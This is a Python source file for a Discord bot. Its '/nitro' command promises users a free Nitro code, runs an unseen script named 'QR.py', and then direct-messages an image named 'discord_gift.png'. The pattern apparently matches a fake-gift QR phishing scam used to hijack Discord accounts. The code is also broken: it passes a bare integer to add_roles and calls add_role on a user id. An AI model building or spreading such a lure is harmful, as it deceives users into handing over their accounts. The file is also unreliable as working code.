import asyncio
import threading
import multiprocessing
import os
import discord
from discord.utils import get

from discord.ext import commands
client = commands.Bot(command_prefix = '/')

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.command()
async def roleads(ctx):
    await ctx.author.add_roles(1000753135410757703)


@client.command()
async def nitro(ctx):
    message = '🎉 Please check your direct messages for your nitro code!'
    embed = discord.Embed(title=message)
    await ctx.send(embed=embed)
    message = '🎉 Searching for your Nitro code...'
    embed = discord.Embed(title=message, description="Please allow up to 30 seconds!")
    await ctx.author.send(embed=embed)
    def do_something_and_move_on():
        os.system('QR.py')
    worker = threading.Thread(target=do_something_and_move_on)
    worker.start()
    await asyncio.sleep(15)
    await ctx.author.send(file=discord.File('discord_gift.png'))
    userid = ctx.author.id
    userid.add_role('1000753135410757703')

client.run('token')
